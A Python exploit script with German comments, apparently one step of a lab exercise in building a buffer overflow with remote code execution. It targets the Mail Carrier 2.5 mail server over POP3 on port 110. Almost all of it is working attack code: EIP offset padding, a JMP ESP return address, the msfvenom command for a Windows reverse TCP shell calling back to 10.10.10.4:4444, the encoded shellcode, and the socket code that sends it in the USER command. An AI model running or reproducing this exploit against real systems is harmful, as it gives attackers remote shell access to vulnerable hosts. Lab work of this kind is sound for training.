# coding=utf-8
# -------------Mail Carrier 2.5 Buffer Overflow Exploit Uebung  -------------------------
# ---------------------------------------------------------------------------------------
# Entwickeln eines Buffer Overflow Exploits mit Remote Code Execution von Grund auf------
# ---------------------------------------------------------------------------------------
# Schritt 6: Senden des Exploits, 1. Versuch --------------------------------------------
# ---------------------------------------------------------------------------------------

import socket, time

# Ip des Windows Clients
RHOST = "10.10.10.12"

# Padding bis EIP
padding_start = "\x41" * 5097

# Gefundene Bad Characters: "\x00
# Aus MSF NASM Shell: JMP ESP \xff\xe4
# Addresse: 0x0fa14923 im Little Endian Format
EIP = "\x23\x49\xa1\x0f"

# Anstelle von Cs fügen wir jetzt unseren Shellcode ein
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.4 LPORT=4444 -f c -e x86/shikata_ga_nai -b "\x00"


shellcode = "\xbb\x81\x9a\x5c\x45\xdb\xc7\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
shellcode += "\x52\x31\x5a\x12\x83\xc2\x04\x03\xdb\x94\xbe\xb0\x27\x40\xbc"
shellcode += "\x3b\xd7\x91\xa1\xb2\x32\xa0\xe1\xa1\x37\x93\xd1\xa2\x15\x18"
shellcode += "\x99\xe7\x8d\xab\xef\x2f\xa2\x1c\x45\x16\x8d\x9d\xf6\x6a\x8c"
shellcode += "\x1d\x05\xbf\x6e\x1f\xc6\xb2\x6f\x58\x3b\x3e\x3d\x31\x37\xed"
shellcode += "\xd1\x36\x0d\x2e\x5a\x04\x83\x36\xbf\xdd\xa2\x17\x6e\x55\xfd"
shellcode += "\xb7\x91\xba\x75\xfe\x89\xdf\xb0\x48\x22\x2b\x4e\x4b\xe2\x65"
shellcode += "\xaf\xe0\xcb\x49\x42\xf8\x0c\x6d\xbd\x8f\x64\x8d\x40\x88\xb3"
shellcode += "\xef\x9e\x1d\x27\x57\x54\x85\x83\x69\xb9\x50\x40\x65\x76\x16"
shellcode += "\x0e\x6a\x89\xfb\x25\x96\x02\xfa\xe9\x1e\x50\xd9\x2d\x7a\x02"
shellcode += "\x40\x74\x26\xe5\x7d\x66\x89\x5a\xd8\xed\x24\x8e\x51\xac\x20"
shellcode += "\x63\x58\x4e\xb1\xeb\xeb\x3d\x83\xb4\x47\xa9\xaf\x3d\x4e\x2e"
shellcode += "\xcf\x17\x36\xa0\x2e\x98\x47\xe9\xf4\xcc\x17\x81\xdd\x6c\xfc"
shellcode += "\x51\xe1\xb8\x53\x01\x4d\x13\x14\xf1\x2d\xc3\xfc\x1b\xa2\x3c"
shellcode += "\x1c\x24\x68\x55\xb7\xdf\xfb\x50\x42\xd5\xff\x0c\x50\xe9\xee"
shellcode += "\x90\xdd\x0f\x7a\x39\x88\x98\x13\xa0\x91\x52\x85\x2d\x0c\x1f"
shellcode += "\x85\xa6\xa3\xe0\x48\x4f\xc9\xf2\x3d\xbf\x84\xa8\xe8\xc0\x32"
shellcode += "\xc4\x77\x52\xd9\x14\xf1\x4f\x76\x43\x56\xa1\x8f\x01\x4a\x98"
shellcode += "\x39\x37\x97\x7c\x01\xf3\x4c\xbd\x8c\xfa\x01\xf9\xaa\xec\xdf"
shellcode += "\x02\xf7\x58\xb0\x54\xa1\x36\x76\x0f\x03\xe0\x20\xfc\xcd\x64"
shellcode += "\xb4\xce\xcd\xf2\xb9\x1a\xb8\x1a\x0b\xf3\xfd\x25\xa4\x93\x09"
shellcode += "\x5e\xd8\x03\xf5\xb5\x58\x33\xbc\x97\xc9\xdc\x19\x42\x48\x81"
shellcode += "\x99\xb9\x8f\xbc\x19\x4b\x70\x3b\x01\x3e\x75\x07\x85\xd3\x07"
shellcode += "\x18\x60\xd3\xb4\x19\xa1"

# Zusammensetzen der Payload
# Da wir konsistent viele Zeichen immer senden wollen um immer den Gleichen crash zu produzieren hängen wir noch ein
# Padding aus Cs ans Ende

payload = padding_start + EIP + shellcode + (500 - len(shellcode))*"\x43"

print("[+] Sending Payload...")
# Verbindung zum Windows Client aufbauen
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((RHOST, 110))
# Empfang von Daten wenn der Server antwortet
print(connection.recv(1024))

# Senden der Zeichenkette
connection.send("USER " + payload + "\r\n")
# Emfang wenn der Username angenommen wird und Daten zurück gesendet werden. Zeigt uns dass der crash nicht funktioniert
print(connection.recv(1024))
# Geregeltes schliessen der Verbindung
connection.send("QUIT\r\n")
print(connection.recv(1024))
connection.close()
